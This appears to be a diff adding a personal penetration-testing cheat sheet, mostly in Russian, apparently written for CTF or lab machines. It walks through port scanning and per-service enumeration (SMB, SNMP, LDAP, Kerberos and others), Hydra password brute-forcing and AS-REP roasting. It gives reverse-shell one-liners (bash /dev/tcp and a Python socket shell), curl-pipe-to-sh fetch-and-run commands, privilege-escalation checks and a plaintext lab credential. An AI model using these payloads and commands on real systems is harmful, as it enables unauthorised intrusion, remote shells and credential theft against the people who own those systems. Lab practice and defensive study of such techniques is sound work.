@@ -1,0 +1,219 @@
+linux
+
+https://github.com/danielmiessler/SecLists.git = seclist
+
+linpeas: https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
+
+chmod +x linpeas.sh
+./linpeas.sh
+
+# Local network
+sudo python3 -m http.server 80 #Host
+curl 10.10.10.10/linpeas.sh | sh #Victim
+
+1. Разведка и сканирование портов
+Начните со сканирования портов, чтобы понять, какие службы запущены на целевом сервере.
+
+Bash
+# Быстрое сканирование всех портов (SYN-скан)
+sudo nmap -sS -p- --min-rate 5000 <TARGET_IP> -oN nmap_all.txt
+
+# Детальное сканирование найденных портов (версии, скрипты)
+sudo nmap -sC -sV -p<PORTS> <TARGET_IP> -oN nmap_detail.txt
+
+# Сканирование UDP-портов (топ-100)
+sudo nmap -sU --top-ports 100 <TARGET_IP>
+
+
+2. Действия по открытым портам
+
+where /R C:\ index.php
+
+
+Порт 21 (FTP)
+
+Анонимный вход: ftp <TARGET_IP> (логин: anonymous, пароль: anonymous или пустой)
+
+Проверка уязвимостей и анонимного доступа через Nmap:
+
+Bash
+nmap --script ftp-anon,ftp-vuln* -p 21 <TARGET_IP>
+
+Порт 22 (SSH)
+
+Проверка методов аутентификации:
+
+Bash
+ssh -v user@<TARGET_IP>
+Перебор слабых паролей (Hydra):
+
+Bash
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>
+
+
+Порты 80 / 443 (HTTP / HTTPS)
+
+Анализ веб-технологий:
+
+Bash
+whatweb http://<TARGET_IP>
+Поиск скрытых директорий и файлов:
+
+Bash
+ffuf -u http://<TARGET_IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt
+# или через gobuster
+gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+Сканирование CMS (WordPress, Joomla, Drupal):
+
+
+feroxbuster= directoryler =>windows =/usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
+linux =/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+
+
+dnssum --dnsserver IP -f directory domen (-o ZZZZ.xml fayl)
+
+		subdomains-top1million-110000.txt — оптимальный выбор по соотношению скорости и полноты:
+			/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+
+		bitquark-subdomains-top100000.txt — содержит популярные поддомены на основе анализа публичных источников:
+			/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
+
+Bash
+wpscan --url http://<TARGET_IP> --enumerate p,u
+
+Порты 139 / 445 (SMB)
+
+Перечисление общих ресурсов:
+
+Bash
+smbpasswd -r IP -U user Old SMB password: New SMB password
+netexec smb baby.vl -u Caroline.Robinson -p 'BabyStart123!' -M change-password -o NEWPASS=Test123.
+smbmap -H <IP> -u <пользователь> -p <пароль> -d <домен>
+
+smbclient -L //<TARGET_IP>/ -N
+crackmapexec smb <TARGET_IP> --shares
+enum4linux -a <TARGET_IP>
+Подключение к найденной шаре:
+
+Bash
+smbclient //<TARGET_IP>/<SHARE_NAME> -N
+
+Порт 161 (SNMP)
+
+Чтение community-строк (public/private):
+
+Bash
+snmpwalk -v2c -c public <TARGET_IP>
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt <TARGET_IP>
+Порты 3306 (MySQL) / 5432 (PostgreSQL)
+Подключение со стандартными учётками:
+
+Bash
+mysql -u root -h <TARGET_IP> -p
+psql -h <TARGET_IP> -U postgres
+3. Закрепление и получение Reverse Shell
+После нахождения уязвимости на веб-сервере (LFI, RCE, загрузка файлов) поднимите слушаетль на Kali и отправьте обратный шелл:
+
+Bash
+# На Kali (слушатель)
+nc -lvnp 4444
+Популярные пейлоады для жертвы:
+
+Bash: bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1
+
+Python 3:
+
+Bash
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<KALI_IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+Стабилизация TTY-терминала:
+
+Bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Нажмите Ctrl+Z на клавиатуре
+stty raw -echo; fg
+export TERM=xterm
+
+4. Повышение привилегий (Privilege Escalation)
+Получив доступ с правами обычного пользователя (www-data или локального юзера), проверьте вектор поднятия прав до root.
+
+Быстрый автоматический сбор информации
+Запустите скрипт автоматической разведки:
+
+Bash
+# Скачивание и запуск LinPEAS
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+Ручные проверки
+Права Sudo:
+
+Bash
+sudo -l
+(Если есть бинарники с правами sudo, проверьте их на GTFOBins)
+
+SUID / SGID файлы:
+
+Bash
+find / -perm -u=s -type f 2>/dev/null
+Задачи Cron:
+
+Bash
+cat /etc/crontab
+ls -la /etc/cron*
+Версия ядра Linux (для поисков Kernel Exploits):
+
+Bash
+uname -a
+lsb_release -a
+Сетевые соединения на localhost (127.0.0.1):
+
+Bash
+ss -tulpn
+
+
+Порт 53 (DNS)
+Попытка передачи зоны (Zone Transfer / AXFR):
+
+Bash
+dig axfr @<TARGET_IP> <DOMAIN_NAME>
+dnsrecon -d <DOMAIN_NAME> -n <TARGET_IP>
+Перебор поддоменов:
+
+Bash
+gobuster dns -d <DOMAIN_NAME> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r <TARGET_IP>
+Порт 25 / 465 / 587 (SMTP)
+Перечисление пользователей (VRFY / EXPN / RCPT TO):
+
+Bash
+smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames.txt -t <TARGET_IP>
+nc -nv <TARGET_IP> 25
+# В консоли: VRFY root
+Порт 111 (RPC / rpcbind) / Порт 2049 (NFS)
+Проверка экспортируемых сетевых папок NFS:
+
+Bash
+showmount -e <TARGET_IP>
+rpcinfo -p <TARGET_IP>
+Монтирование доступной папки на Kali:
+
+Bash
+sudo mkdir /mnt/target_nfs
+sudo mount -t nfs <TARGET_IP>:/<EXPORTED_FOLDER> /mnt/target_nfs -o nolock
+(Если права настроены как no_root_squash, файлы, созданные локальным root в этой директории, сохранят SUID-бит на целевой машине).
+
+Порты 389 / 636 (LDAP / LDAPS)
+Анонимный опрос базы LDAP (Anonymous Bind):
+
+Bash
+ldapsearch -x -H ldap://<TARGET_IP> -b "dc=example,dc=com"
+Автоматическое перечисление структуры:
+
+Bash
+nmap -p 389 --script ldap-search,ldap-brute <TARGET_IP>
+Порт 88 (Kerberos)
+Перебор существующих учетных записей (User Enumeration):
+
+Bash
+kerbrute userenum -d <DOMAIN_NAME> --dc <TARGET_IP> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+Запрос билетов без пароля (AS-REP Roasting):
+
+Bash
+GetNPUsers.py <DOMAIN_NAME>/ -no-pass -usersfile users.txt -dc-ip <TARGET_IP>
